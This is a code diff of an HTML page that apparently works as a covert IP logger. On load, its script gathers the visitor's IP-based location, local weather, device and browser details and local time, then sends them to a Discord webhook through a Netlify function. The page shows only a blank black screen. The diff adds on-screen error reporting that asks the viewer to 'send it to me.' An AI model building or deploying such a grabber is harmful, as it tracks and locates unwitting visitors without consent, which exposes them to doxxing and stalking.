@@ -8,12 +8,30 @@
     html, body {
       margin: 0; padding: 0; height: 100%;
       background: black;
+      color: red;
       user-select: none;
       overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: monospace, monospace;
+      font-size: 1rem;
+      text-align: center;
+      padding: 10px;
+    }
+    #error-message {
+      cursor: pointer;
+      user-select: text;
+      max-width: 90vw;
+      word-break: break-word;
+      display: none;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
+  <div id="error-message" title="Click to copy error message"></div>
+
 <script>
   const netlifyFunctionUrl = "/.netlify/functions/log-ip";
 
@@ -21,7 +39,6 @@
     return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
   }
 
-  // Simple UA parser for device info (phone model, OS, browser)
   function parseUserAgent(ua) {
     let device = "Unknown Device";
     let os = "Unknown OS";
@@ -71,22 +88,26 @@
   }
 
   async function sendDiscordWebhook(embed) {
-    await fetch(netlifyFunctionUrl, {
+    const res = await fetch(netlifyFunctionUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ embeds: [embed] }),
     });
+    if (!res.ok) {
+      const text = await res.text();
+      throw new Error(`Discord webhook error: ${res.status} - ${text}`);
+    }
   }
 
   (async () => {
+    const errorDiv = document.getElementById('error-message');
+
     try {
       const data = await fetchIPInfo();
       const weatherData = await fetchWeather(data.latitude, data.longitude);
       const uaInfo = parseUserAgent(navigator.userAgent);
-
       const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
 
-      // Parse wttr.in data safely
       let weather = null;
       if (weatherData && weatherData.current_condition && weatherData.current_condition.length > 0) {
         weather = weatherData.current_condition[0];
@@ -143,8 +164,16 @@
       };
 
       await sendDiscordWebhook(embed);
-    } catch (_) {
-      // Silent fail
+
+    } catch (err) {
+      const errorDiv = document.getElementById('error-message');
+      errorDiv.style.display = "block";
+      errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy this error message.`;
+      errorDiv.onclick = () => {
+        navigator.clipboard.writeText(err.message)
+          .then(() => alert("Error message copied! Send it to me."))
+          .catch(() => alert("Failed to copy error message."));
+      };
     }
   })();
 </script>
